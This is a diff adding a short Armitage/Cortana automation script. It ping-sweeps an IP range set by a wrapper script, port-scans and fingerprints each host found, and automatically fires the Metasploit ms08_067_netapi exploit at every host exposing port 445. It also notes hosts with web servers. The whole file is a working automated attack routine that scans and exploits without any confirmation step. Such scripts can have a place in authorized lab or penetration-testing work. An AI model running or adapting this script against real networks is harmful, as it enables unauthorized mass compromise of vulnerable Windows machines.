@@ -1,0 +1,26 @@
+$IPrange = "REPLACEME";
+#Do not modify the above line, it is modified when you run the armitage.sh [password] [IPRange]
+
+on ready
+{
+say("Starting a ping sweep.");
+cmd_async("db_nmap $IPrange -PR");
+}
+
+on host_add
+{
+say("Starting a port scan on $1")
+cmd_async("db_nmap $1 -O -sV ");
+cmd_async("db_nmap $1 -p- ");
+
+}
+on service_add_445
+{
+say ("Starting ms08_067_netapi on $1");
+exploit("windows/smb/ms08_067_netapi", "$1");
+}
+
+on service_add_80
+{
+say ("Website found on $1")
+}
